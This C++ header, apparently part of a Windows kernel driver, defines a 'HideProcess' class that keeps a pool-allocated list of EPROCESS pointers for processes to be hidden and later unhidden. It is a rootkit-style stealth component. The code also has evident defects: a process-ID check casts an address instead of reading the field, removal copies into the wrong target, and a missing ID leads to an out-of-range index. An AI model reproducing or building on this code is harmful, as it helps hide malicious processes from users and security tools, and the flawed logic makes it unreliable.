#pragma once
#include "definitions.h"


class HideProcess {
public:
	PVOID HiddenList = NULL;
	ULONG HiddenCount = 0;
	SIZE_T BufferSize = 0;
	BOOL AddToHidden(PEPROCESS AddHidden) {
		PVOID TempHidden = ExAllocatePoolWithTag(NonPagedPool, BufferSize + sizeof(PEPROCESS), 'ThPb');
		if (TempHidden == NULL) {
			return FALSE;
		}
		if (HiddenList != NULL) {
			RtlCopyMemory(TempHidden, HiddenList, BufferSize);
		}
		RtlCopyMemory((PVOID)((SIZE_T)TempHidden + BufferSize), &AddHidden, sizeof(PEPROCESS));
		if (HiddenList != NULL) {
			ExFreePool(HiddenList);
		}
		HiddenList = ExAllocatePoolWithTag(NonPagedPool, BufferSize + sizeof(PEPROCESS), 'HpMb');
		if (HiddenList == NULL) {
			ExFreePool(TempHidden);
			return FALSE;
		}
		RtlCopyMemory(HiddenList, TempHidden, BufferSize + sizeof(PEPROCESS));
		ExFreePool(TempHidden);
		BufferSize += sizeof(PEPROCESS);
		HiddenCount++;
		return TRUE;
	}


	BOOL RemoveFromHidden(USHORT ProcessId, ULONG HiddenIndex, PEPROCESS* UnhiddenProcess) {
		PEPROCESS RemoveProcess = NULL;
		PEPROCESS CurrentProcess = NULL;
		PEPROCESS* TempHidden = NULL;
		if (HiddenIndex < HiddenCount) {
			RtlCopyMemory(&RemoveProcess, (PVOID)((ULONG64)HiddenList + (HiddenIndex * sizeof(PEPROCESS))), sizeof(PEPROCESS));
		}
		else {
			if (ProcessId == 0) {
				return FALSE;
			}
			for (ULONG CurrentIndex = 0; CurrentIndex < HiddenCount; CurrentIndex++) {
				RtlCopyMemory(&CurrentProcess, (PVOID)((ULONG64)HiddenList + (CurrentIndex * sizeof(PEPROCESS))), sizeof(PEPROCESS));
				if ((USHORT)((ULONG64)CurrentProcess + EPOF_UniqueProcessId) == ProcessId) {
					HiddenIndex = CurrentIndex;
					break;
				}
			}
		}
		TempHidden = (PEPROCESS*)ExAllocatePoolWithTag(NonPagedPool, BufferSize - sizeof(PEPROCESS), 'ThPb');
		if (TempHidden == NULL) {
			return FALSE;
		}
		if (HiddenIndex == 0) {
			RtlCopyMemory(TempHidden, (PVOID)((ULONG64)HiddenList + sizeof(PEPROCESS)), BufferSize - sizeof(PEPROCESS));
			RtlCopyMemory(*UnhiddenProcess, TempHidden, sizeof(PEPROCESS));
		}
		else if (HiddenIndex == HiddenCount - 1) {
			RtlCopyMemory(TempHidden, HiddenList, BufferSize - sizeof(PEPROCESS));
			RtlCopyMemory(*UnhiddenProcess, (PVOID)((ULONG64)HiddenList + (HiddenIndex * sizeof(PEPROCESS))), sizeof(PEPROCESS));
		}
		else {
			RtlCopyMemory(TempHidden, HiddenList, HiddenIndex * sizeof(PEPROCESS));
			RtlCopyMemory(*UnhiddenProcess, (PVOID)((ULONG64)HiddenList + HiddenIndex * sizeof(PEPROCESS)), sizeof(PEPROCESS));
			RtlCopyMemory((PVOID)((ULONG64)TempHidden + HiddenIndex * sizeof(PEPROCESS)), (PVOID)((ULONG64)HiddenList + (HiddenIndex + 1) * sizeof(PEPROCESS)), BufferSize - ((HiddenIndex + 1) * sizeof(PEPROCESS)));
		}
		if (HiddenList != NULL) {
			ExFreePool(HiddenList);
		}
		HiddenList = (PEPROCESS*)ExAllocatePoolWithTag(NonPagedPool, BufferSize - sizeof(PEPROCESS), 'HpMb');
		if (HiddenList == NULL) {
			ExFreePool(TempHidden);
			return FALSE;
		}
		RtlCopyMemory(HiddenList, TempHidden, BufferSize - sizeof(PEPROCESS));
		ExFreePool(TempHidden);
		BufferSize -= sizeof(PEPROCESS);
		HiddenCount--;
		return TRUE;
	}
};
HideProcess ProcessHide = { 0 };